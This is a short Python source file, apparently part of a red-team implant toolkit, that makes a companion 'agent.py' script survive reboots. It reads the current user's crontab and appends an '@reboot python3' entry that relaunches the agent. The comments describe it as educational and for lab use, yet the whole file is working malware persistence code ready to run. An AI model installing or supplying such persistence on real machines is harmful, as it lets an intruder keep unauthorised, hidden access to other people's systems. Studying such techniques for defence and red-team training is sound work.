# ============================================================
# Persistence Module
# Installs agent as a cron job to survive system reboots
# Simulates real-world Red Team persistence techniques
# For educational use only - run in lab environment
# ============================================================

import subprocess
import os

def install_persistence():
    # Get absolute path of agent.py
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent.py")

    # Read existing crontab
    try:
        current = subprocess.check_output("crontab -l", shell=True).decode()
    except subprocess.CalledProcessError:
        current = ""

    # Check if already installed
    if "agent.py" in current:
        print("[!] Persistence already installed")
        return

    # Add @reboot entry
    new_cron = current + f"@reboot python3 {path}\n"
    subprocess.run(f'echo "{new_cron}" | crontab -', shell=True)
    print(f"[+] Persistence installed: @reboot python3 {path}")

if __name__ == "__main__":
    install_persistence()

